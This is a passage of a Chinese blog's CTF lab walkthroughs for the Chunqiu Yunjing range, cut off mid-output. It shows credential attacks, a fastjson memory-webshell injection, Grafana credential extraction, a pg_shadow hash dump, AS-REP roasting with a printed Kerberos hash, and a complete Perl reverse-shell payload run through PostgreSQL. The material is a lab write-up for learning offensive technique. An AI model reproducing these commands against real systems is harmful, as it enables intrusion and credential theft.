在172.30.12.5上面放上恶意的jar文件，然后开启一个web服务，再用利用工具去执行 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# nxc rdp 172.30.12.6 -u lv -p Asd123132. --local-auth[proxychains] DLL init: proxychains-ng 4.17[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OK[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OKRDP 172.30.12.6 3389 Server02 [*] Windows 10 or Windows Server 2016 Build 17763 (name:Server02) (domain:Server02) (nla:True)[proxychains] Strict chain ... 192.168.11.1:9999 ... 172.30.12.6:3389 ... OKRDP 172.30.12.6 3389 Server02 [+] Server02\\lv:Asd123132. (Pwn3d!) 用户添加成功了，挂上代理，远程桌面连接，flag02在C:\\Users\\Administrator\\flag下 flag03172.30.12.236主机开放了8009端口，登录口传入的数据为 JSON 格式。探测 fastjson 版本 payload：&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot; https://raw.githubusercontent.com/h0ny/repo/main/images/2ed229594166743d.png) 用bp的插件注入内存马,哥斯拉连接，flag03在/root/flag/下 flag04这个靶机还有第二张网卡 1234567891011121314151617181920/ &gt;ip a1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:e2 brd ff:ff:ff:ff:ff:ff inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0 valid_lft 315354333sec preferred_lft 315354333sec inet6 fe80::216:3eff:fe0d:aae2/64 scope link valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:16:3e:0d:aa:92 brd ff:ff:ff:ff:ff:ff inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1 valid_lft forever preferred_lft forever inet6 fe80::216:3eff:fe0d:aa92/64 scope link valid_lft forever preferred_lft forever 上传一个fscan，然后扫一下，地址为172.30.54.12，需要二层内网代理，这台机器上有grafana+postgres两个服务，grafana存在弱口令admin/admin登录,在web3的机器上上传一个exp,可以跑到postgres的密码 123452024/07/04 12:20:59 Target vulnerable has plugin [alertlist]2024/07/04 12:20:59 Got secret_key [SW2YcwTIb9zpOOhoPsMm]2024/07/04 12:20:59 There is [0] records in db.2024/07/04 12:20:59 type:[postgres] name:[PostgreSQL] url:[localhost:5432] user:[postgres] password[Postgres@123] database:[postgres] basic_auth_user:[] basic_auth_password:[]2024/07/04 12:20:59 All Done, have nice day! psql -h 172.30.54.12 -p 5432 -U postgres连接,查询root的密码select usename, passwd from pg_shadow; 12345postgres=# select usename, passwd from pg_shadow; usename | passwd----------+------------------------------------- root | md5da974531914a7c2c56df745574a5bd3a postgres | md5dd27d33705155fd675e498384ad3d2ea 爆破出来是P@ssw0rd123,在web03的机器上监听一个端口，然后用perl反弹一个shell 1select system(&#x27;perl -e \\&#x27;use Socket;$i=&quot;172.30.54.179&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;\\&#x27;&#x27;); 然后psql提权，flag04在/root/flag/下","categories":[{"name":"春秋云镜","slug":"春秋云镜","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"春秋云镜-Time","slug":"春秋云镜-Time","date":"2025-04-08T16:08:14.000Z","updated":"2025-04-19T13:26:00.230Z","comments":true,"path":"2025/04/09/春秋云镜-Time/","permalink":"https://lvzhouhang.xyz/2025/04/09/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/","excerpt":"","text":"FLAG1首先用fscan进行信息搜集 1234567891011121314151617181920212223242526┌──(root㉿kali)-[~/Desktop/tmp]└─# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.0[2025-04-08 12:36:27] [INFO] 暴力破解线程数: 1[2025-04-08 12:36:27] [INFO] 开始信息扫描[2025-04-08 12:36:27] [INFO] 最终有效主机数量: 1[2025-04-08 12:36:27] [INFO] 开始主机扫描[2025-04-08 12:36:27] [INFO] 有效端口数量: 65535[2025-04-08 12:36:27] [SUCCESS] 端口开放 39.98.117.163:22[2025-04-08 12:36:28] [SUCCESS] 服务识别 39.98.117.163:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.][2025-04-08 12:37:17] [SUCCESS] 端口开放 39.98.117.163:1337[2025-04-08 12:37:27] [SUCCESS] 服务识别 39.98.117.163:1337 =&gt;[2025-04-08 12:41:00] [SUCCESS] 端口开放 39.98.117.163:7473[2025-04-08 12:41:01] [SUCCESS] 端口开放 39.98.117.163:7474[2025-04-08 12:41:08] [SUCCESS] 端口开放 39.98.117.163:7687[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7473 =&gt; Banner:[.P][2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7474 =&gt; [http][2025-04-08 12:41:18] [SUCCESS] 服务识别 39.98.117.163:7687 =&gt; fscan扫描靶机，有1337、7473、7474、7687端口，7474端口是neo4j，默认密码neo4j:neo4j(可以登录，但是没什么用)，还有一个CVE-2021-34371，可以直接一把梭哈https://github.com/zwjjustdoit/CVE-2021-34371.jar，反弹一个shell flag01在neo4j的目录下 FLAG2然后上传一个fscan扫描内网（会出来没扫描出来的情况，需要多扫描几次） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657neo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20./fscan -h 172.22.6.36/20 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.6.25 is alive(icmp) Target 172.22.6.36 is alive(icmp) Target 172.22.6.38 is alive[*] LiveTop 172.22.0.0/16 段存活数量为: 3[*] LiveTop 172.22.6.0/24 段存活数量为: 3[*] Icmp alive hosts len is: 3172.22.6.36:22 open172.22.6.25:445 open172.22.6.25:139 open172.22.6.25:135 open172.22.6.38:80 open172.22.6.38:22 open172.22.6.36:7687 open172.22.6.25:445 open172.22.6.12:445 open172.22.6.12:139 open172.22.6.25:139 open172.22.6.25:135 open172.22.6.12:135 open172.22.6.12:88 openstart vulscan[*] NetInfo [*]172.22.6.25 [-&gt;]WIN2019 [-&gt;]172.22.6.25[*] NetInfo [*]172.22.6.12 [-&gt;]DC-PROGAME [-&gt;]172.22.6.12[*] NetBios 172.22.6.25 XIAORANG\\WIN2019 [*] OsInfo 172.22.6.12 (Windows Server 2016 Datacenter 14393)[*] NetBios 172.22.6.12 [+] DC:DC-PROGAME.xiaorang.lab Windows Server 2016 Datacenter 14393[*]172.22.6.25 [-&gt;]WIN2019 [-&gt;]172.22.6.25[*] NetBios 172.22.6.25 XIAORANG\\WIN2019 [*] WebTitle http://172.22.6.38 code:200 len:1531 title:后台登录[*] WebTitle https://172.22.6.36:7687 code:400 len:50 title:None已完成 7/7[*] 扫描结束,耗时: 1m36.67936002s 172.22.6.38是一个web服务 ，用万能密码可以登录成功存在sql注入，但是不会跳转，用sqlmap跑一下 flag02在数据库里，将oa_db.oa_users的email提出，处理一下将用户名提取出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261┌──(root㉿kali)-[~/Desktop/tmp]└─# cat 1|grep -E &#x27;\\w*@&#x27; -o|grep -E &#x27;[^@]*&#x27; -o &gt;username┌──(root㉿kali)-[~/Desktop/tmp]└─# cat usernamemengxiangmennanemenxilongmenxixiaomiaoguimiaoshumingfuminglianmingsongmingyanmoqianmouchunmoushanmuchengmuchunmujienangongjunniuyanongfannongyannongyannongyaonongzhennongzhuoulunpanbaopangchengpangningpangtaipangzhenpengyuanpinghaopuyangfuqiaiqiangjunqianqingqianyiqianyouqiaodeqiaomeiqidiaofangqiguanrouqijieqinguanqiruoqiyanqiyongqiyuanqiyueqizhuqulurangsiboranqunrongbiaorongxianyuruanyongrubaoruibeiruilinruishiruisongshangjieshangjunshangqianshanshaoshaocaishaokangshaotingshaoyishengzheshenhangshenjiaoshenshanshenshanshentuyunsheweiyueshieshijianshijunshilanshishushouchunshoujuanshuangchenshudishuichengshuifeishushishuzhensisiwusituxinsiyisongmingsongqinsongyansunduangusunlisunmeisunzhongdataigongyuantangguitangqiaotangrongtangshuntaoyatianxintongdongtonghaotongxuewangnuowangxingwangyanwangyanwangyingwansifeiwansifuwansishunwanyanweichengweichipengweigongweihuaweihuiweiliangweishengshanweiwanweixianweixianweixuewenbiaowenbowendongwengbangwengongwenliangwenshaowohongwohuawucewudawuhuanwulunwunuoxiahanxiaixiamaoxiangdongxiangjuanxiangqianxiangxinxiangyuxiaojinxiaorongxiayuxieyixijunximenshixingquanxingxixingyexionghongxiqixiqidixixiaxiyaoxiyixuanjiangxuanluxuanqunxudixuehexundixupengxuxinyangdanhanyangdanheyangjuyanglangyanguoyanjiyanjinyanqianyanyangmeiyanyueyanyunyanzhenyetaiyexingyezongyueyifuyinbinyinchenyingbiaoyingchanyingjunyingpengyingshiyinyuyixueyouchaoyouyiyuanchangyuboyufenyuhuiyuhuiyujianyujunyulingyulvxueyunhuiyunqianyunzhongyuruiyushayuwanyuxiyuxiaozangpengzangyaozhangxinzhangzhaozhannanzhaoxiuzhengluzhengpubeizhengxiaozhenhuizhenjunzhenyanzhongliyingzhouchunzhoujingzhoujunzhouqizhouyazhouyizhuangsongzhubinzhufengzhukezhulizhupengzhupengzhuqinzhuzhuzizhuansongzizhuanyuzizhuanzhizoubaozoufuzouqizuofenzuoqiufazuoqiutaizuoshun 然后对域控进行Kerberos AS-REP Roasting 攻击 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262┌──(root㉿kali)-[~/Desktop/tmp]└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcatImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User pangzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User pengyuan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User qiaomei doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User qiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User rangsibo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User rubao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User sheweiyue doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User shuzhen doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User tangrong doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User tangshun doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weicheng doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weishengshan doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User weixian doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wenbiao doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User wenbo doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wengbang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wenliang doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$wenshao@XIAORANG.LAB:fde3340835efa9c8cb0330ae567c5c46$8228d9ae7bbd8e0ddcb991f14dfdd653bf2f05bd78effb9f48aa1095c7f4ee832254961a1d17de3e3e6cfd76c4048774b1c30bf45220d6f4f7dd6d958395dff97b733372d3562060209baa7ae25ca86734be598b1e7e42678d9bfacf14676b5d4f51b268a780b4dd6da66b2518dcf4888d658ea8ade7a35a40a9d6965bb304995498bf1cdcea67431d870c9e69982bcb25037fa8f8dc16695e0ecce65333e6f88231016fdc6312adf0d77749b63f85d05d1437d9a4290520de6272d3c0a636b4baf8ed7de278fcb5106503e57e35df5adbb9dd46503a58c0655e538ea24774f2c08234f6905e3120da8fc3fa[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User wohua doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User xiqidi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)[-] User xiyi doesn&#x27;t have 